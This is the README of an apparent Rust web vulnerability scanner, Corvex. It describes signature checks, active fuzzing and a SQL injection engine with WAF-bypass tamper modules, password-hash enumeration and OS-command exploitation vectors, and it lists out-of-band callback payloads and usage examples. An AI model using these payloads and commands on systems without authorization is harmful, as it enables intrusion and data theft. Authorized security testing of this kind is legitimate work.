# Corvex

Corvex is a Rust web vulnerability scanner with three engines: a **signature engine** that probes targets against a 7,236-test database, an **active fuzzing engine** that crawls the target, extracts forms and parameters, and injects payloads to detect injection vulnerabilities in real time, and a **SQL injection engine** with five detection techniques, 8 DBMS backends, ~50 WAF-bypass tamper modules, and full exploitation capabilities. Built on `tokio` for concurrency and raw HTTP/1.x framing with direct OpenSSL handshakes, SNI support, TLS 1.3 ciphersuites, and ALPN negotiation.

## What it does

### Signature engine (passive)

- Probes a target with Corvex's full signature database (7,236 tests + 1,257 outdated-software fingerprints + 362 favicon hashes + 260 server-banner rules + 170 auth realms + 40 404-page signatures + 1,825 dictionary entries).
- Expands `@LFI(nix|win|abs|url)` for local-file-inclusion tests, plus `@JUNK(n)`, `@IP`, `@HOSTNAME`, and every variable from `db_variables` (`@CGIDIRS`, `@USERS`, `@ADMIN`, ...).
- Runs 26 scan plugins: shellshock (CVE-2014-6271), Spring Boot actuator enumeration, Optionsbleed (CVE-2017-9798), MS10-070 ASP.NET padding oracle, PUT/DELETE verification, mod_userdir enumeration, mod_negotiation detection, exposed site files (`.git/`, `.env`, `backup.*`, `WEB-INF/`, ...), CGI directory probing, favicon fingerprinting, robots.txt harvesting, HTML path extraction, cookie leak analysis, HTTP auth realm matching with default-credential lookup, the full `db_tests` runner, and the active SQL injection scanner.
- Extracts TLS certificate subject, issuer, SAN, cipher, and protocol on the initial HTTPS handshake and surfaces them as findings.

### Active fuzzing engine

- **HTML crawler** with BFS link following, respecting scope (domain / subdomains / folder / page), configurable depth (`--crawl-depth`) and URL cap (`--max-urls`). Skips non-HTML responses and soft-404 pages. Live crawl progress tracked via `urls_crawled` counter visible in both the CLI output and the desktop app's stat cards.
- **Form extractor** parses every `<form>` on discovered pages, collecting method, action, and all input/select/textarea fields with their types and default values.
- **Injection-point framework** turns crawled URLs + forms into `FuzzTarget`s with typed `InjectionPoint`s (query param, POST body field, header, cookie, path segment). The `FuzzRunner` iterates one-parameter-at-a-time, sending mutated requests through the same `nfetch` pipeline so cookies, auth, evasion, and cancellation all work uniformly.
- Active fuzzing is **opt-in** via `--active` or `-Tuning g`. The default `@@DEFAULT` profile stays signature-only so existing workflows are unaffected.

### SQL injection engine

The SQL injection engine activates as part of the active fuzzing phase and provides deep injection testing comparable to dedicated SQL injection tools.

#### Detection techniques (5)

| Technique | How it works |
| --- | --- |
| **Error-based** | Injects boundary probes (`'`, `"`, `\`, `)`, ...`) and scans responses for 48 DBMS error patterns. At level >= 2, extracts data via `EXTRACTVALUE`, `UPDATEXML`, `CAST`, `CONVERT`. Fastest technique — typically 1-3 requests per parameter. |
| **Boolean-based blind** | Injects true/false SQL conditions (`AND 1=1` vs `AND 1=2`) and compares responses using trigram page-ratio analysis. Double-confirms with a secondary boolean pair to reduce false positives. ~3-6 requests per parameter. |
| **Time-based blind** | Injects `SLEEP()`, `WAITFOR DELAY`, `pg_sleep()`, `DBMS_PIPE.RECEIVE_MESSAGE` payloads and measures response time against a baseline median (3 samples). Confirms with a doubled delay. Request timeout auto-extended. |
| **UNION query-based** | Detects column count via `ORDER BY` binary search (up to 50 columns), finds visible columns via marker injection, then extracts `version()`, `database()`, `current_user()` through the visible column. Most powerful for direct data extraction. |
| **Stacked queries** | Tests semicolon-separated statement support via time-based confirmation. Primarily effective against MSSQL and PostgreSQL. Enables INSERT/UPDATE and OS command execution. Requires risk >= 2. |

Techniques run in priority order (Error -> Boolean -> Time -> UNION -> Stacked) and short-circuit when a parameter is confirmed at high confidence.

#### DBMS support (8)

MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite, MariaDB, IBM DB2, and Firebird. Each backend has tailored:
- Error message fingerprinting patterns (48 regex patterns total)
- Sleep/delay function syntax
- String concatenation and quoting syntax
- `information_schema` / catalog query equivalents
- File I/O and OS command execution vectors
- UNION FROM clause requirements (Oracle: `DUAL`, DB2: `SYSIBM.SYSDUMMY1`, Firebird: `RDB$DATABASE`)

Auto-detection via error fingerprinting, or force a specific backend with `--sqli-dbms`.

#### Tamper modules (~50)

WAF/IDS bypass transforms applied to SQL payloads before injection. Organized in five categories:

| Category | Modules | Examples |
| --- | --- | --- |
| Space replacement | 8 | `space2comment`, `space2hash`, `space2dash`, `space2plus`, `space2randomblank` |
| Encoding | 10 | `charencode`, `chardoubleencode`, `charunicodeencode`, `base64encode`, `overlongutf8`, `unmagicquotes` |
| Keyword obfuscation | 12 | `randomcase`, `randomcomments`, `versionedkeywords`, `commalesslimit`, `commentbeforeparentheses` |
| Comparison/logic | 8 | `between`, `greatest`, `equaltolike`, `symboliclogical`, `bluecoat`, `modsecurityversioned` |
| Injection/advanced | 12 | `apostrophemask`, `nonrecursivereplacement`, `sp_password`, `sleep2getlock`, `dunion` |

Chain multiple modules: `--tamper space2comment,randomcase,between`.

#### Enumeration

Post-detection extraction using whichever technique confirmed the vulnerability:

- **Databases** — `information_schema.schemata`, `pg_database`, `master..sysdatabases`, `all_tables`, `sqlite_master`, `syscat.schemata`, `RDB$RELATIONS`
- **Tables** — per-database table listing via DBMS-specific catalog queries
- **Columns** — per-table column enumeration
- **Users** — database user accounts
- **Password hashes** — `mysql.user`, `pg_shadow`, `sys.sql_logins`, `dba_users`
- **Privileges** — user privilege enumeration

For boolean-blind and time-blind, uses character-by-character binary search (ASCII bisection, ~8 requests per character). For UNION-based, direct data substitution in the visible column.

#### Exploitation

Requires `--sqli-risk 3`:

| Capability | DBMS | Vector |
| --- | --- | --- |
| **File read** | MySQL | `LOAD_FILE()` |
| | PostgreSQL | `pg_read_file()` |
| | MSSQL | `OPENROWSET(BULK)` |
| | Oracle | `UTL_FILE.GET_RAW()` |
| **File write** | MySQL | `INTO OUTFILE` |
| | PostgreSQL | `COPY TO` |
| | MSSQL | `xp_cmdshell echo` |
| **OS command** | MSSQL | `xp_cmdshell` |
| | PostgreSQL | `COPY TO PROGRAM` |
| | MySQL | UDF `sys_exec()` |
| | Oracle | `DBMS_SCHEDULER` |

#### OAST integration

When `--oast` is set, injects DNS callback payloads for out-of-band blind confirmation:
- MySQL: `LOAD_FILE('\\\\token.host\\a')`
- MSSQL: `xp_dirtree '\\\\token.host\\a'`
- PostgreSQL: `COPY TO PROGRAM 'nslookup token.host'`
- Oracle: `UTL_HTTP.REQUEST('http://token.host/')`

### Shared infrastructure

- Supports Basic, Digest (RFC 2617, qop=auth), and NTLM Type-1 HTTP authentication.
- TLS with SNI (Server Name Indication), TLS 1.3 ciphersuites, and ALPN `http/1.1` negotiation for compatibility with modern CDN/WAF-fronted servers.
- Loads user-supplied test databases at runtime via `-Userdbs`.
- Emits scan results as text, CSV, JSON, XML, HTML (using placeholder templates), or SQL.
- Structured error reporting: DNS failures, TLS handshake errors, HTTP timeouts, and connection resets are logged with full context so users can diagnose connectivity issues from the log panel.
- **Tauri v2 desktop app** with a React + TypeScript frontend, live findings streaming, 5-column stat dashboard (requests, findings, errors, elapsed, URLs crawled) with real-time crawler progress tracking, collapsible sidebar, light/dark/system theme, globally-responsive font scaling (12/14/16/19px), scan history persisted in SQLite, 5-tab fuzzing reference panel (modules, techniques, tamper, DBMS, enumerate), and integrated SQL injection configuration.

## Quick start

```bash
git clone https://github.com/fazminnizam/corvex
cd corvex
cargo build --release

# Signature-only scan (default)
./target/release/corvex --host http://www.example.com

# Active scan with crawler + injection fuzzers
./target/release/corvex --host http://www.example.com --active --scope domain

# Active scan with SQL injection testing
./target/release/corvex --host http://www.example.com --active --scope domain \
  --sqli-level 3 --sqli-risk 2 --sqli-techniques BEUST
```

Prebuilt OpenSSL is not required — the workspace enables the `vendored` feature and builds OpenSSL from source. On Windows, this needs **Strawberry Perl** (not MSYS2 perl) and NASM on `PATH`; on Linux/macOS, a C toolchain is enough. When building from Git Bash on Windows, ensure Strawberry Perl is found first: `PATH="/c/Strawberry/perl/bin:$PATH" cargo build`.

## Desktop app

```bash
cargo install tauri-cli --version '^2'
cd crates/corvex-desktop/ui && npm install && cd ../../..
cargo tauri dev --manifest-path crates/corvex-desktop/Cargo.toml
```

Features:
- Frameless window with custom titlebar and window controls
- Collapsible sidebar with SVG icons (224px expanded / 64px collapsed)
- **5-column stat dashboard** (Requests, Findings, Errors, Elapsed, URLs Crawled) — the crawl card shows real-time progress against the user's `--max-urls` cap and `--crawl-depth` setting
- Live findings table with expandable detail rows, 4-way filter (All / Signature / Active / Fingerprint)
- Tracing log panel with structured error messages (DNS, TLS, HTTP errors surfaced with context)
- Scan history persisted in SQLite with CRUD operations
- **5-tab fuzzing reference panel**: Modules (22 fuzzers), Techniques (5 detection methods with how-it-works detail), Tamper (50 WAF-bypass modules), DBMS (8 backends with error patterns / sleep functions / catalogs), Enumerate (8 extraction targets with DBMS-specific queries)
- **SQL injection configuration panel** in the scan form: level (1-5), risk (1-3), technique checkboxes (B/E/U/S/T), DBMS dropdown, time delay, tamper modules, enumerate checkboxes — all with detailed info tooltips
- Settings page with theme (light / dark / system) and **globally-responsive font scaling** (Small 12px / Medium 14px / Large 16px / Extra large 19px) — all text, tooltips, code elements, sidebar, stat cards, tables, and form labels scale immediately
- Light and dark themes with 30+ CSS custom properties

## Crate layout

Four-crate Cargo workspace:

- [crates/corvex-core](crates/corvex-core) — engine library: config, CLI, HTTP client (SNI + TLS 1.3 + ALPN), DSL parser + evaluator, variable expansion, crawler (with live `urls_crawled` counter), form extractor, fuzzer framework, scope filter, scan loop, plugin trait, report trait, target resolution, tuning / mutate / evasion, and the SQL injection engine (DBMS fingerprinting, 5 detection techniques, payload generation, ~50 tamper modules, enumeration, exploitation).
- [crates/corvex-plugins](crates/corvex-plugins) — 26 scan plugins + 6 report sinks.
- [crates/corvex](crates/corvex) — the `corvex` CLI binary.
- [crates/corvex-desktop](crates/corvex-desktop) — Tauri v2 desktop GUI with React + TypeScript frontend.

The 14 database files under [program/databases](program/databases) are compiled at build time into a single `bincode` blob and embedded via `include_bytes!`. The binary is self-contained.

## CLI flags

### Signature engine

| Flag | Purpose |
| --- | --- |
| `-host`, `-url` | Target host or URL |
| `-port` | One or more ports, comma-separated |
| `-ssl`, `-nossl` | Force SSL on/off |
| `-Tuning` | Filter tests by category (see below) |
| `-Plugins` | Plugin selector (`@@ALL`, `@@DEFAULT`, `-robots`, ...) |
| `-Format` | Output format(s): `txt`, `csv`, `json`, `htm`, `xml`, `sql` |
| `-output` | Write the report to this file |
| `-evasion` | IDS evasion transforms `1`-`9`, `A` |
| `-Add-header` | Extra request header, repeatable |
| `-id` | HTTP auth `user:pass[:realm]` (Basic / Digest / NTLM) |
| `-Userdbs` | Merge an additional user test CSV |
| `-useproxy` | Proxy URL override |
| `-404string` / `-404code` | Custom 404 heuristic |
| `-vhost` | Virtual host header |
| `-useragent` | Custom User-Agent |
| `-timeout`, `-Pause`, `-maxtime` | Time limits |
| `--max-concurrent-requests` | In-flight request cap |
| `--max-concurrent-hosts` | Parallel host cap |
| `--dbcheck` | Print database row counts |
| `--list-plugins` | Print plugin registry |
| `--Version` | Print version |

### Active fuzzing engine

| Flag | Purpose |
| --- | --- |
| `--active` | Enable active fuzzing (implies `--crawl`) |
| `--crawl` | Enable the HTML crawler |
| `--crawl-depth N` | Max link-following depth (default 3) |
| `--max-urls N` | Hard cap on crawled URLs (default 500) |
| `--scope` | `domain`, `subdomains`, `folder`, or `page` |
| `--exclude-pattern` | Exclude URLs matching this regex (repeatable) |
| `--openapi FILE` | Seed the crawl from an OpenAPI / Swagger spec |
| `--form-login URL` | POST to this URL to obtain a session cookie |
| `--form-login-data KV` | Form login body pairs (repeatable) |
| `--cookie-jar FILE` | Import Chrome / Firefox SQLite cookie DB |
| `--resume ID` | Resume a suspended scan session |
| `--oast URL` | Out-of-band callback host for blind detection |

### SQL injection engine

| Flag | Purpose |
| --- | --- |
| `--sqli-level N` | Testing level 1-5. 1=GET/POST params, 2=+cookies, 3=+User-Agent/Referer, 4=+other headers, 5=all |
| `--sqli-risk N` | Risk level 1-3. 1=safe read-only, 2=+OR-based, 3=+UPDATE/INSERT/file-write/OS-cmd |
| `--sqli-techniques BEUST` | Techniques to test: B=boolean, E=error, U=union, S=stacked, T=time |
| `--sqli-dbms DBMS` | Force DBMS: `mysql`, `postgresql`, `mssql`, `oracle`, `sqlite`, `mariadb`, `db2`, `firebird` |
| `--sqli-time-delay N` | Seconds for time-based blind delay (default 5) |
| `--tamper MODULES` | Comma-separated tamper module names (50 available) |
| `--sqli-second-url URL` | Second-order injection: check results on this URL |
| `--sqli-prefix PREFIX` | Force injection prefix (e.g. `')` or `1 AND`) |
| `--sqli-suffix SUFFIX` | Force injection suffix (e.g. `-- -` or `#`) |
| `--sqli-enumerate WHAT` | Post-detection targets: `dbs`, `tables`, `columns`, `users`, `dump`, `passwords`, `file-read`, `file-write`, `os-cmd` |

Run `corvex --Help` for the complete list.

## Examples

```bash
# Signature scan with software-ID tuning, JSON output
corvex --host http://example.com -Tuning b -Format json --output scan.json

# Active scan: crawl + fuzz with domain scope
corvex --host http://example.com --active --scope domain --crawl-depth 4

# Active scan with limited crawl (10 URLs max)
corvex --host http://example.com --active --scope domain --max-urls 10

# Active scan seeded from an OpenAPI spec
corvex --host http://api.example.com --active --openapi ./openapi.json

# SQL injection scan with error + boolean + time techniques
corvex --host http://example.com --active --scope domain \
  --sqli-level 2 --sqli-risk 1 --sqli-techniques EBT

# SQL injection with MySQL targeting and WAF bypass
corvex --host http://example.com --active --scope domain \
  --sqli-dbms mysql --tamper space2comment,randomcase,between

# Full SQL injection scan with enumeration
corvex --host http://example.com --active --scope domain \
  --sqli-level 3 --sqli-risk 2 --sqli-techniques BEUST \
  --sqli-enumerate dbs,tables,columns,users,passwords

# SQL injection with exploitation (risk 3 required)
corvex --host http://example.com --active --scope domain \
  --sqli-level 5 --sqli-risk 3 --sqli-techniques BEUST \
  --sqli-enumerate dbs,tables,dump,file-read,os-cmd

# SQL injection with second-order detection
corvex --host http://example.com --active --scope domain \
  --sqli-level 3 --sqli-risk 2 --sqli-second-url http://example.com/profile

# SQL injection with OAST for blind confirmation
corvex --host http://example.com --active --scope domain \
  --sqli-level 3 --sqli-risk 2 --oast callback.burpcollaborator.net

# Authenticated scan with form login
corvex --host http://example.com --active --scope folder \
  --form-login http://example.com/login \
  --form-login-data 'user=admin' --form-login-data 'pass=secret'

# Signature + active combined, HTML report
corvex --host http://example.com --active --scope domain -Tuning bg -Format htm --output report.html

# Import browser cookies for an authenticated scan
corvex --host http://internal.example.com --active --cookie-jar ~/cookies.sqlite
```

## DSL

Corvex's test database matches responses with a tiny DSL:

- `CODE:` / `!CODE:` — match or negate HTTP status codes (regex).
- `BODY:` / `!BODY:` — match or negate a regex against the response body.
- `HEADER:` / `!HEADER:` — match or negate `name:value` against response headers.
- `COOKIE:` / `!COOKIE:` — match or negate a stored cookie value.
- `@LFI()` — placeholder expanded at runtime into `(BODY:<nix-canary>|BODY:<win-canary>)`.
- `&&` joins matchers (logical AND). Regex alternation (`|`) and `(?i)` work inside each pattern.

## Tuning categories

| Code | Category |
| --- | --- |
| `0` | File Upload |
| `1` | Interesting File / Seen in logs |
| `2` | Misconfiguration / Default File |
| `3` | Information Disclosure |
| `4` | Injection (XSS / Script / HTML) |
| `5` | Remote File Retrieval — Inside Web Root |
| `6` | Denial of Service |
| `7` | Remote File Retrieval — Server Wide |
| `8` | Command Execution / Remote Shell |
| `9` | SQL Injection |
| `a` | Authentication Bypass |
| `b` | Software Identification |
| `c` | Remote Source Inclusion |
| `d` | WebService |
| `e` | Administrative Console |
| `g` | Active fuzzing (crawler + injection probes) |
| `x` | Invert (include everything except the rest) |

## Architecture

- **HTTP**: direct TCP via `tokio::net::TcpStream`, HTTP/1.x framed by hand. TLS via `openssl::ssl::SslConnector` with SNI hostname set via `ssl.set_hostname()`, TLS 1.3 ciphersuites via `set_ciphersuites()`, ALPN `http/1.1` negotiation, and `SECLEVEL=0` with `ALL:COMPLEMENTOFALL` ciphers for legacy fingerprinting. Response timing captured via `Instant` for time-based blind injection detection.
- **TLS metadata**: `SslInfo` captured from the live handshake (cipher, protocol, cert chain). Stored on the per-host `Mark` and surfaced by the `ssl` plugin.
- **Error reporting**: DNS resolution failures, TLS handshake errors, HTTP request failures, and timeouts are logged at `ERROR`/`DEBUG` level with full context (target, error message, URI). These surface in the desktop app's log panel so users can diagnose connectivity issues.
- **Plugins**: compile-time `Plugin` trait with six hook points (`Start`, `Recon`, `Scan`, `Prefetch`, `Postfetch`, `Active`). Ascending weight order per hook. 26 plugins registered.
- **Active engine**: the `Active` hook runs after `Scan`. The crawler produces a `CrawlGraph` of discovered pages + forms, incrementing `GlobalState::urls_crawled` for each page visited. Each active plugin receives the graph and drives a `FuzzRunner` that iterates injection points one parameter at a time.
- **SQL injection engine**: lives in `corvex-core/src/sqli/` with 8 submodules. DBMS fingerprinting via 48 error regex patterns across 8 backends. Five detection technique modules run in priority order with short-circuit on high-confidence findings. ~50 tamper modules for WAF bypass. Enumeration engine with boolean binary-search and UNION extraction. Exploitation module with file I/O and OS command execution (risk-gated).
- **Scope**: `ScopeFilter` constrains the crawler and active plugins to the target domain, subdomains, folder, or page. `--exclude-pattern` regex blocklists layer on top.
- **Form extraction**: `scraper`-based parser extracts `<form>` elements with all fields, producing `FormDescriptor`s that the fuzzer framework converts into `FuzzTarget`s with typed `InjectionPoint`s.
- **Authentication**: Basic, Digest (RFC 2617, qop=auth), NTLM Type-1. Form-based auth via `--form-login`.
- **Databases**: 14 CSV files compiled to bincode at build time. User DBs merged at runtime via `-Userdbs`.
- **Concurrency**: `tokio` runtime. Multiple hosts in parallel; per-host semaphore for in-flight requests.
- **Reports**: `ReportSink` trait with text, CSV, JSON, XML, HTML (template-based), and SQL implementations.
- **Desktop**: Tauri v2 + React. `TauriEventSink` streams findings live. `ScanStats` polls `GlobalState` including `urls_crawled` for real-time crawler progress. SQLite history. Tracing log bridge. Globally-responsive font scaling via `--font-base` CSS variable (all text, tooltips, code, tables, sidebar, stat cards scale together). SQL injection configuration panel with level/risk/technique/DBMS/tamper/enumerate controls. 5-tab fuzzing reference panel with detailed technique/tamper/DBMS/enumerate documentation.

## Developing

```bash
cargo check --workspace
cargo build --workspace --release
cargo test --workspace     # 50 tests currently passing

./target/debug/corvex --dbcheck
./target/debug/corvex --list-plugins
./target/debug/corvex --Version
```

Environment:

- `RUST_LOG=corvex_core=debug,tests_plugin=info` for per-plugin tracing.
- `RUST_LOG=http=debug,scan=debug` to see HTTP errors and scan-level failures.
- `OPENSSL_NO_VENDOR=1` to use system OpenSSL instead of the vendored build.

## Authorized use only

This tool is intended for use in environments where you have explicit permission to test. Running it against servers you do not own or operate without written authorization is illegal in most jurisdictions. You assume all responsibility for how you use it.

## License

Copyright (c) 2026 Fazmin Nizam. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License version 3, as published by the Free Software Foundation.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. The full license text is available at https://www.gnu.org/licenses/gpl-3.0.txt.
